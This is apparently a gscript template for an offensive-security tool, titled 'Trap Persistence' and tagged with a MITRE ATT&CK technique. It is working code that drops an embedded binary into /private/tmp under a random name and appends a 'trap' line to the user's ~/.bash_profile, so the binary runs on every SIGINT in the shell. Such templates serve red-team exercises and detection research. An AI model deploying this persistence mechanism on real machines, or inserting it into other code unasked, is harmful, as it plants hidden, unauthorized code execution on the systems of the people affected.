// Example gscript template
// Title: Trap Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using Trap
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1154

//priority:90
//timeout:150
//import:/private/tmp/example.macho

function BeforeDeploy() {
  LogInfo("starting execution of Trap Persistence");
  return true; 
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.macho");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "/private/tmp/"+name;
  WriteFile(name, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+name);
  
  // Persist our binary w/ a trap on SIGINT (signal 2), using .bash_profile to get it into the builtin shell
  var whoami = GetUser();
  var file_location = "/Users/"+whoami.username+"/.bash_profile";
  LogInfo("File Location: "+ file_location);
  var trap_bytes = StringToByteArray("trap " + name + " 2 \r\n");
  var does = FileExists(file_location);
  if (does.FileExists) {
    LogInfo("file already exists, so appending");
    var obj = AppendFileBytes(file_location, trap_bytes);
    LogInfo(obj.fileError); 
  } else {
    LogInfo("file does not exist, so creating it");  
    WriteFile(file_location, trap_bytes, 0755);
  }
  LogInfo("Persisted binary using trap, for SIGINT, so the .bash_profile");

  return true;
}

function AfterDeploy() {
  LogInfo("done, deployed binary with Trap persistence");
  return true;
}